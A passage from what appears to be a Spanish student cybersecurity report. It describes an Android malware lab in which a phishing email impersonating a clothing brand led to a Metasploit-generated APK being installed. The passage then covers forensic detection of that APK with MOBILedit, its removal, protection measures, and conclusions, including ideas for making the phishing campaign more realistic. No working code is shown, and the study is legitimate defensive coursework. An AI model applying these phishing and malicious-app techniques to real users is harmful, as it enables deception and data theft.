Esto puede hacer más realista el ataque, ya que la aplicación al iniciarla no hace nada y sumando al mensaje anterior, la víctima podría pensar que no funciona porque la aplicación está hecha para una versión anterior. 

El resto del ataque es similar al anterior y se ha obtenido la misma información. 

### 4.3.7 Análisis forense

Para realizar el análisis forense, uso la herramienta **MOBILEdit**. 
Inicio la herramienta y esta identifica el móvil rápidamente: 

![image](https://github.com/user-attachments/assets/d2f7cd5d-6599-4ab6-bf56-765dd9458911)

Dentro de esta herramienta se pueden realizar diferentes tipos de análisis, desde ver todo el móvil hasta solo las aplicaciones o solo la información que queramos. 

En este caso, voy a realizar un análisis de las aplicaciones.

![image](https://github.com/user-attachments/assets/6baea085-6692-48d0-8528-84985a69b5ed)

En la propia herramienta salen todas las aplicaciones instaladas en el dispositivo, donde podemos elegir cuales analizar y cuales no (o analizar todas directamente). 

Viendo las aplicaciones instaladas, me topo con la aplicación de Kimoa, con el nombre de paquete com.metasploit.stage. Este nombre es bastante sospechoso, asi que la marco para analizarla.

![image](https://github.com/user-attachments/assets/08001a5a-483c-4d1c-8ee6-1609c4200dd1)

Con esto se inicia el análisis, del cual se generará un informe donde se verá información del móvil y de esa aplicación.

Esta es la primera página del análisis, donde se observa información del dispositivo.

![image](https://github.com/user-attachments/assets/e0c9e8ad-4d13-4164-a9ea-b6e4d0179b4c)

De la aplicación se obtiene la siguiente información: 

![image](https://github.com/user-attachments/assets/e50fd412-569f-49de-a51a-e7d632b5297b)

Como información sospechosa se puede observar el nombre del paquete, el tamaño de la aplicación de tan solo 12KB y que no se ha podido verificar correctamente la APK. 

Como información extra, tenemos la hora de instalación y de actualización, además del tiempo de uso. 

---

## 4.4 Desinfección del móvil

En este caso, la desinfección del móvil sería un proceso tan sencillo como borrar la aplicación debido a que la misma no crea ningún servicio adicional o algo parecido, eliminando la aplicación, se elimina el problema.

## 4.5 Medidas de protección

Como se ha podido observar, los móviles Android ya vienen bastante protegidos por defecto gracias a los servicios de Google que nos avisan sobre las posibles aplicaciones maliciosas que se encuentran en nuestro dispositivo.

Aun así, nunca está de más tener una protección adicional y tomar una serie de medidas para que nuestro dispositivo sea lo más seguro posible. 

### 4.5.1 Medidas para el usuario promedio

Estas son medidas que van dirigidas a personas normales:

- Tomar conciencia sobre:
  - Los permisos requeridos por las aplicaciones.
  - Ataques como el phishing, que afectan a millones de usuarios todos los días y cada vez son más difíciles de distinguir.
-  Revisar de vez en cuando los permisos que tiene cada aplicación.
-  No descargar aplicaciones de fuentes no confiables.
-  Cifrar la información del dispositivo

### 4.5.2 Medidas para empresas

En las empresas, el uso del móvil no es el mismo que le damos usuarios como tu o como yo, estas empresas ya tienen (o deberían tener) su propia política para el uso de estos dispositivos con una serie de medidas para protegeros, como las siguientes:

- Uso de VPN
- Cifrar el contenido del dispositivo
- Usar 2MFA para proteger los servicios y aplicaciones que usen en el trabajo
- Formar a los propios empleados
- Usar almacenamiento en la nube para archivos y documentos importantes
- Dar un móvil de empresa a los empleados, el cual solo utilicen en la empresa, evitando que traigan el suyo propio.

---

# 5. Conclusiones finales

## 5.1 Grado de cumplimiento de objetivos finales

**Conocer el proceso de extracción de información de móviles.**

Se ha usado Android Studio, que es un IDE usado para programas aplicaciones en Android y que integra la herramienta ADB que sirve para ver y manipular la información en un móvil Android. 

Además, para la extracción de información  y análisis forense se ha usado la herramienta MOBILedit. 

Este objetivo se ha cumplido. 

**Infectar y desinfectar un dispositivo móvil.**

Se ha realizado un ataque en el cual mediante un correo malicioso y haciéndose pasar por una marca de ropa conocida por la víctima se ha conseguido instalar una aplicación maliciosa en un dispositivo legítimo, obteniendo información valiosa sobre el mismo. 

El proceso de desinfección en este caso sería tan sencillo como eliminar la aplicación del sistema. 

Este objetivo se ha cumplido

**Tomar medidas para la protección de la ciberseguridad en los dispositivos móviles.**

Se ha hablado sobre posibles medidas para proteger los dispositivos móviles, tanto para 
usuarios normales como para empleados de empresas. 

Este objetivo se ha cumplido.

## 5.2 Propuestas de mejora o ampliaciones futuras 

- Desarrollar la app de forma manual para tener un  mayor control sobre la misma
- Usar Gophish para lanzar la campaña de phishing y que sea más realista
- Disponer de un dispositivo real actual para analizar de mejor manera la estructura interna de un Android 16
- Tener los móviles rooteados para asi tener un mayor control sobre los mismos y ver más información
- Hablar sobre más ataques a dispositivos móviles como por ejemplo el MITM
- Investigar más a fondo sobre iOS
- Hacer que la APK se conecte a una IP pública
















